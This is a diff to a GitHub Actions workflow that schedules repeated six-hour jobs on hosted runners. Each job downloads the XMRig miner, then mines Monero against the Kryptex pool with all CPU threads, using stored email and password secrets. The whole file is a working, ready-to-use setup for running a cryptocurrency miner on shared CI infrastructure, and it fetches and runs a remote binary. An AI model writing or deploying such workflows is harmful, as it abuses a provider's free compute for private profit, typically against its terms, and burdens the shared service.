@@ -1,71 +1,40 @@
-name: Enhanced Kryptex Pool Mining
+name: Kryptex CPU Mining
 
 on:
   schedule:
-    - cron: '5 */6 * * *'  # Every 6 hours with 5-min offset for auto-restart post-timeout
-  workflow_dispatch:  # Manual trigger
+    - cron: '5 0,6,12,18 * * *'  # Every 6 hours 5 minutes: 00:05, 06:05, 12:05, 18:05 UTC
+  workflow_dispatch:  # Allow manual trigger
 
 jobs:
   mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 360  # Enforces 6-hour run; GitHub cancels ~6h5m max
+    timeout-minutes: 365  # 6 hours 5 minutes
 
     steps:
-      - name: Checkout repo (for potential scripts)
-        uses: actions/checkout@v4
-
-      - name: Update system and install dependencies
+      - name: Install dependencies
         run: |
-          sudo apt-get update -y
-          sudo apt-get install -y wget tar build-essential libssl-dev libhwloc-dev curl
+          sudo apt-get update
+          sudo apt-get install -y wget tar
 
-      - name: Download latest XMRig
+      - name: Download and extract XMRig for Kryptex
         run: |
-          # Fetch latest release tag for stability
-          LATEST_TAG=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep tag_name | cut -d '"' -f4)
-          wget https://github.com/xmrig/xmrig/releases/download/$LATEST_TAG/xmrig-$LATEST_TAG-linux-static-x64.tar.gz
-          tar -xzf xmrig-*.tar.gz
-          cd xmrig-*
-          echo "Using XMRig version: $LATEST_TAG"
+          mkdir -p ~/kryptex
+          cd ~/kryptex
+          wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+          tar -xzf xmrig-6.21.3-linux-static-x64.tar.gz
+          cd xmrig-6.21.3
+          chmod +x xmrig
 
-      - name: Health check setup
+      - name: Start mining
         run: |
-          # Simple bash script to log periodic stats (runs in background)
-          cat > monitor.sh << 'EOF'
-          #!/bin/bash
-          while true; do
-            echo "$(date): Uptime check - Mining active"
-            sleep 300  # Log every 5 mins
-          done
-          EOF
-          chmod +x monitor.sh
-
-      - name: Start Kryptex XMR Mining with Monitoring
-        run: |
-          cd xmrig-*
-          # Background monitor
-          ./monitor.sh &
-          # Enhanced config: Kryptex XMR pool, email auth, 80% threads, low donation, verbose logs, retry on fail
+          cd ~/kryptex/xmrig-6.21.3
+          worker_name="github-actions-${{ github.run_id }}"
           ./xmrig \
             -o xmr.kryptex.network:7029 \
-            -u ${{ secrets.KRYPTEX_EMAIL }}.github-actions-worker \
-            -p x \
-            --cpu-max-threads-hint=80 \
-            --donate-level=1 \
-            --print-time=60 \
-            --log-file=xmrig.log \
-            --retries=3 \
-            --retry-pause=5 \
-            --user-agent="GitHubActionsMiner/1.0" \
-            --verbose
-        env:
-          # Password secret available for future app login scripts (e.g., PowerShell SendKeys)
-          KRYPTEX_PASSWORD: ${{ secrets.KRYPTEX_PASSWORD }}
-
-      - name: Post-run summary (if job ends early)
-        if: always()
-        run: |
-          if [ -f xmrig.log ]; then
-            echo "Final log excerpt:"
-            tail -20 xmrig.log
-          fi
+            -u ${{ secrets.KRYPTEX_EMAIL }}/$worker_name \
+            -p ${{ secrets.KRYPTEX_PASSWORD }} \
+            -k \
+            --coin monero \
+            -a rx/0 \
+            --threads=$(nproc) \
+            --donate-level=1
